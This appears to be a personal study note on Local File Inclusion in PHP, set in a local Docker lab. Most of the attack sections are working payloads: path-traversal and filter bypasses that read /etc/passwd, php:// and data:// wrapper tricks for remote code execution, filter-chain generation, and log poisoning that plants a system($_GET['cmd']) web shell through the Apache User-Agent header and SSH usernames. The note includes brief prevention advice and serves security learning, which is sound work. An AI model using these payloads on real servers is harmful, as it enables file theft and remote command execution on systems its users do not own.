The Local File Inclusion (LFI) vulnerability is a computer security vulnerability that occurs when a web application fails to properly validate user input, allowing an attacker to access local files on the web server.

In many cases, attackers exploit the LFI vulnerability by abusing input parameters in the web application. Input parameters are data that users enter into the web application, such as URLs or form fields. Attackers can manipulate the input parameters to include local file paths in the request, which can allow them to access files on the web server. This technique is known as "Path Traversal" and is commonly used in LFI attacks.

In the Path Traversal attack, the attacker uses special characters and escape characters in the input parameters to navigate through web server directories and access files in sensitive locations on the system.

For example, the attacker could include "../" in the input parameter to navigate up the directory structure and access files in sensitive system locations.

To prevent LFI attacks, it is important for web application developers to properly validate and filter user input, limiting access to system resources and ensuring that files can only be included from allowed locations. In addition, companies should implement appropriate security measures, such as file encryption and limiting unauthorized user access to system resources.

# Example

We can do a basic LFI attack where we will read the */etc/passwd* file:

```php
<?php
    $filename = $_GET['filename'];
    include($filename); // 'include' keyword opens a file
?>
```

```
http://localhost/index.php?filename=/etc/passwd
```

In this case the victim is trying to protect itself by limiting the directory from which we can call the file:

```php
<?php
    $filename = $_GET['filename'];
    include("/var/www/html/" . $filename); // /var/www/html//etc/passwd /var/www/html/../../../../../../etc/passwd (directory path traversal, tirar hacia la raiz para ejecutar el dichero)
?>
```

We can bypass it doing a **Path Traversal** by navigating to the root and then to the directory and file we want:

```
http://localhost/index.php?filename=../../../../../../../etc/passwd
```

In this case the victim tries to remove the '../' so that we cannot do a **Path Traversal**:

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    include("/var/www/html/" . $filename);
?>
```

If it is not recursive, we can bypass this as follows:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd
```

In this way, even if the substitution removes the '../' we will still be left with a '../'.

In this case the victim tries to protect itself by using regular expressions to prevent access to '/etc/passwd':

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    if(preg_match("\/etc\/passwd/", $filename) === 1) {
        echo "\n[!] No es posible visualizar el contenido de este archivo\n";
    } else {
        include("/var/www/html/" . $filename);
    }
?>
```

We can bypass this as follows:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc///////////passwd

http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/././././passwd
```

Here the user tries to delimit by extension the files that can be added:

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    include("/var/www/html/" . $filename . ".php");
?>
```

In *older versions of PHP* you can insert a nullbyte "%00" to bypass file extensions (**Null Byte Injection**):

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd%00

http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd\0
```

Also in *older versions of PHP*, in case of filters like 'make sure that the last 6 characters of the input is not passwd':

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    if(substr($filename, -6, 6) != "passwd") {
        include($filename);
    }
?>
```

We can bypass it like this:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd/.
```

Also in *older versions of PHP*, in case of filters like 'I want the file to end with the extension .txt':

```php
<?php
    $filename = $_GET['filename'];
    $filename = str_replace("../", "", $filename);
    
    if(substr($filename, -4, 4) != ".txt") { // Esto hace alusion a los ultimos 4 caracteres de la cadena de texto
        include($filename);
    }
?>
```

It would also be bypassed as in the previous case:

```
http://localhost/index.php?filename=....//....//....//....//....//....//....//etc/passwd/.
```

## Wrappers

We can use the wrapper *php://filter* to represent the same data contained in the file as *base64*, among others

```
http://localhost/index.php?filename=php://filter/convert.base64-encode/resource=/etc/passwd
```

The resulting *base64* string can be saved in a file (in this case we will call it 'myFile') and converted to plain text in this way:

```shell
# The 'sponge' command is used to put the result in the same file
cat data | base64 -d | sponge data
```

We can use the following wrapper to rotate each character 13 positions:

```
php://filter/read=string.rot13/resource=/etc/passwd
```

We can perhaps execute commands at the system level with the following wrapper:

```
expect://whoami
```

If we change the request from *GET* to *POST* method we could pass data to it with this wrapper and start an RCE:

```
POST /?filename=php://input
```

And we can send as data the command we want:

```php
<?php system("whoami"); ?>
```

If we change the petition as *GET* again we can obtain *RCE* too:

```php
// We convert the command into base64
echo '<?php system("whoami"); ?>' | base64; echo

// We use the base64 command here
data://text/plain;base64,{CODE_IN_BASE}

// We can also handle it with 'cmd'
echo '<?php system($_GET["cmd"]); ?>' | base64; echo
data://text/plain;base64,{CODE_IN_BASE}&cmd=whoami
```

### Filter Chains

We have to keep in mind that PHP needs to convert the data from UTF8 to UTF7 so that the '=' does not cause conflict and error:

```bash
# UTF8.UTF7 is used to convert from UTF8 to UTF7
php -r "echo file_get_contents('php://filter/convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/tmp/test');"; echo
```

----
> If you don't know which file to point to on a machine, point to *php://temp*
----

To achieve the desired effect and to be able to execute an *RCE* we must introduce characters to the left of the base64 string playing with the encode and decode, manually:

```php
// In this case we are introducing 'Hola'
php://filter/convert.iconv.UTF8. CSIS02022KR | convert.iconv.UTF8.UTF7 | convert.iconv.CP1046.UTF32 | convert.iconv.L6.UCS-2 | convert.ic onv.UTF-16LE.T.61-8BIT | convert.iconv.865.UCS-4LE | convert.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7 | convert. iconv.CP-AR.UTF16 | convert.iconv.8859_4.BIG5HKSCS | convert.ic onv.MSCP1361.UTF-32LE | convert.iconv.IBM932.UCS-2BE | convert.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7 | convert.iconv.JS. UNICODE | convert.iconv.L4.UCS2 | convert.iconv.UCS- 4LE.OSF05010001 | convert.iconv. IBM912.UTF-16LE | convert.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7 | convert.iconv.CP1046.UTF16 | convert.iconv. IS06937. SHIFT_JISX0213 | conver t.base64-decode | convert.base64-encode | convert.iconv.UTF8.UTF7/resource=php://temp
```

We can also do this automatically with the [php_filter_chain_generator]("https://github.com/synacktiv/php_filter_chain_generator") tool:

```bash
python3 php_filter_chain_generator.py --chain 'Hola'

python3 php_filter_chain_generator.py --chain '<?php system("whoami"); ?>'

python3 php_filter_chain_generator.py --chain '<?php system($_GET['cmd']); ?>'
```

If the web interprets php on the back end, it is worth trying all these wrappers.

----
> Be careful with spaces in the .php file! Delete all spaces manually and then tabulate in case you get a 500 error on our server.
----

### Log Poisoning (LFI -> RCE)

**Log Poisoning** is an attack technique in which an attacker manipulates the log files of a web application to achieve a malicious result. This technique can be used in conjunction with an **LFI** vulnerability to achieve **remote command execution** on the server.

As examples, we will try to poison the *SSH auth.log* and *Apache access.log* resources, starting by exploiting an **LFI** vulnerability first to access these log files. Once we have gained access to these files, we will see how to manipulate them to include malicious code.

In the case of [[SSH]] logs, the attacker can inject **PHP** code into the user field during the authentication process. This allows the code to be recorded in the [[SSH]] log *auth.log* and interpreted at the time the log file is read. In this way, the attacker can achieve a remote execution of commands on the server.

In the case of the **Apache** *access.log* file, the attacker can inject **PHP** code into the User-Agent field of an HTTP request. This malicious code is recorded in the Apache *access.log* log file and is executed when the log file is read. In this way, the attacker can also achieve remote command execution on the server.

It should be noted that on some systems, the *auth.log* file is not used to log [[SSH]] authentication events. Instead, authentication events may be logged in log files with different names, such as *btmp*.

For example, on Debian and Ubuntu based systems, [[SSH]] authentication events are logged in the *auth.log* file. However, on Red Hat and CentOS based systems, [[SSH]] authentication events are logged in the *btmp* file. Although sometimes there may be exceptions.

To prevent **Log Poisoning**, it is important for developers to limit access to log files and ensure that these files are stored in a secure location. In addition, it is important that user input is properly validated and any attempted malicious input is filtered out before it is recorded in the log files.

----

In this example we are going to use a *Docker* image based on *Ubuntu* and we are going to install [[SSH]] and **Apache**:

```bash
# Download the latest ubuntu image
docker pull ubuntu:latest

# Run the container applying portforwarding for Apache and SSH
docker run -dit -p 80:80 -p 22:22 --name logPoisoning ubuntu

# Enter the container with a bash shell
docker exec -it logPoisoning bash

# Install some tools
apt-update
apt install apache2 ssh nano php -y

# Run the services
service apache2 start
service ssh start
```

All program logs are stored in the */var/log* directory. If you run the command *id* and you are in the group *adm* you will have permission to view the logs.

----
> If we want to fix a corrupted log, we must delete the corrupted lines of the log or clean it completely with the command *echo -n '' > {LOG_FILE}*.
----

#### Apache

In the case of Apache, to be able to see the logs we are going to put as owner *www-data* of the *apache2* directory:

```bash
chown www-data:www-data -R apache2/
```

If the *system* function is enabled we can take advantage of the user-agent of the header to inject commands in the *access.log*, where normally the user-agents of the incoming requests are stored.

To find out if the system function is enabled we can use the *phpinfo()* function:

```bash
curl -s -X GET "http://localhost/testing" -H "User-Agent: <?php phpinfo(); ?>"
```

In there, we can see the *disable_functions* and if the function we want to check is not in there, it means that it is enabled.

In case the *system* function is enabled we can start to execute commands:

```bash
# We must escape the $ characters
curl -s -X GET "http://localhost/testing" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"

http://localhost/index.php?filename=/var/log/apache2/access.log&cmd=whoami
```

#### SSH

In [[SSH]], it was normal for logs to be stored in a file called *out.log*, but recently login errors are stored in the *btmp* file.

----
> Caution: As soon as you modify the permissions of the *btmp* file, you will not receive any more logs until the default permissions (660) are restored.
----

As failed logins are stored in this file, the name of the users who try to log in is also stored. Because of this we can try to inject a command instead of the user name:

```bash
# Normal login attempt
ssh loki@localhost

# Injection
ssh '<?php system($_GET["cmd"]); ?>'@localhost

http://localhost/index.php?filename=/var/log/btmp&cmd=whoami
```

These are examples of some services whose logs can be poisoned. It is convenient to check well if we can see the logs of the services we list for possible poisoning.